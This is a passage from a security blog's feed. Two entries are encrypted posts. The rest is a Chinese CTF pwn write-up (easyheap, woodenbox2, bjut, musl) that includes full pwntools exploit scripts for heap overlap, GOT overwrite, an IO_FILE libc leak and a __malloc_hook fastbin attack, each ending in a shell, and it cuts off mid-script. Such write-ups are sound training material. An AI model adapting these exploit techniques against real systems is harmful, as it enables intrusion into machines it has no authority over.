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 </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-27T09:24:01.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 